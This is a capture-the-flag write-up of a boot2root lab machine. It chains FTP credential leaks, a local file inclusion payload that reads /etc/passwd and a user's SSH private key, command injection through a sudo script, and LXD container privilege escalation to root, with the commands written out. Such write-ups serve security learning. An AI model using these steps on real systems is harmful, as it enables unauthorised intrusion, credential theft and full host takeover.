🧠 Overview

This was a boot2root machine focused on web exploitation + privilege escalation via misconfiguration.

The attack chain involved:

Information disclosure
Local File Inclusion (LFI)
Credential reuse
Command injection
LXD privilege escalation
🌐 Step 1: Enumeration

Started with basic recon:

nmap -sC -sV <IP>
Key Findings:
HTTP service running
FTP service available
📂 Step 2: Web Enumeration

Explored the web app and discovered:

Hidden resources
Backup/old files (e.g., .old scripts)

👉 Found a script containing hardcoded FTP credentials

📡 Step 3: FTP Access

Logged into FTP using discovered creds.

ftp <IP>
Found:
Internal file: New_site.txt
Important Info:
New website in development → ".dev" subdomain
Also mentions: id_rsa usage
🌍 Step 4: Subdomain Discovery

Added to /etc/hosts:

<IP> dev.team.thm

Visited:

http://dev.team.thm
🧨 Step 5: LFI Vulnerability

Found parameter:

script.php?page=

Tested:

?page=../../../../etc/passwd

✅ Confirmed Local File Inclusion

🔑 Step 6: Extract SSH Key

Used LFI to access:

/home/<user>/.ssh/id_rsa

Recovered private key (had formatting issues → cleaned it).

🖥️ Step 7: SSH Access
chmod 600 id_rsa
ssh -i id_rsa dale@team.thm

✅ Got user access as dale

⚙️ Step 8: Privilege Escalation (Part 1)

Checked sudo permissions:

sudo -l
Found:
(gyles) NOPASSWD: /home/gyles/admin_checks
💣 Step 9: Command Injection

Analyzed script:

read -p "Enter 'date'..." error
$error

👉 User input executed directly → command injection

Exploit:
sudo -u gyles /home/gyles/admin_checks

Input:

id

Output:

uid=1001(gyles)

✅ Command execution as gyles

🔥 Step 10: Privilege Escalation (Part 2 — LXD)

Checked groups:

id
gyles → lxd
Why this is dangerous:

LXD allows:

Container creation
Host filesystem mounting
Root-level access
🐳 Step 11: LXD Exploit
Import image (from attacker machine)
lxc image import alpine.tar.gz --alias alpine
Create privileged container
lxc init alpine mycontainer -c security.privileged=true
Mount host filesystem
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Start container
lxc start mycontainer
lxc exec mycontainer /bin/sh
👑 Step 12: Root Access

Inside container:

cd /mnt/root/root
cat root.txt

✅ ROOT achieved

🧠 Key Learnings
🔹 1. Chaining vulnerabilities

No single critical bug — multiple small issues combined.

🔹 2. LFI → Critical impact

LFI is often underestimated, but can lead to:

Credential leaks
Full system compromise
🔹 3. Misconfigured sudo scripts

User input executed = instant privilege escalation

🔹 4. Dangerous Linux groups

Being in:

lxd
docker

👉 is basically root if abused properly

⚔️ Final Thoughts

This machine was a perfect example of:

Low severity issues → chained → full compromise
🔗 Full Workflow Summary
Web → FTP → Subdomain → LFI → SSH → Command Injection → LXD → ROOT
